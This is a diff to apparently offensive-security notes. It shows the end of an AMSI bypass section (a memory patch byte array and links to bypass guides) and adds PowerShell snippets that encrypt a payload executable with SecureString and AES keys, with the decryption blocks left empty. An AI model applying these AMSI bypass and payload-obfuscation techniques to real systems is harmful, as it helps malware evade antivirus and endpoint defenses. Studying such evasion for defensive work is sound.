@@ -48,3 +48,49 @@ $Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
 - [Amsi-Bypass-Powershell](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)
 - [A Detailed Guide on AMSI Bypass](https://www.hackingarticles.in/a-detailed-guide-on-amsi-bypass/)
 - [Small modification to Rastemouse's AmsiScanBuffer bypass to use bytes.](https://gist.github.com/FatRodzianko/c8a76537b5a87b850c7d158728717998)
+
+
+# Payload encryption/decryption
+## Alternative 1
+### Encryption
+```powershell
+$File="C:\Windows\System32\calc.exe"
+$Password="LCSE39VzqmSL8fqE"
+
+[Byte[]]$Bytes = [System.IO.File]::ReadAllBytes($File)
+$B64String = [String][Convert]::ToBase64String($Bytes)
+
+$SecureStringData = ConvertTo-SecureString $B64String -AsPlainText -Force
+$SecureStringPwd = ConvertTo-SecureString $Password -AsPlainText -Force
+
+$Encrypted = ConvertFrom-SecureString -SecureString $SecureStringData -SecureKey $SecureStringPwd
+
+$Encrypted | Out-File -FilePath "C:\calc.exe.encrypted"
+```
+### Decryption
+```powershell
+
+```
+
+## Alternative 2
+### Encryption
+```powershell
+$File="C:\Windows\System32\calc.exe"
+$Password="LCSE39VzqmSL8fqE"
+
+[Byte[]]$Bytes = [System.IO.File]::ReadAllBytes($File)
+$B64String = [String][Convert]::ToBase64String($Bytes)
+
+$SecureStringData = ConvertTo-SecureString $B64String -AsPlainText -Force
+
+$AESKey = New-Object Byte[] 32
+[Security.Cryptography.RNGCryptoServiceProvider]::Create().GetBytes($AESKey)
+$Encrypted = ConvertFrom-SecureString -SecureString $SecureStringData -key $AESKey
+
+$Encrypted | Out-File -FilePath "C:\calc.exe.encrypted"
+[String][Convert]::ToBase64String($AESKey)
+```
+### Decryption
+```powershell
+
+```
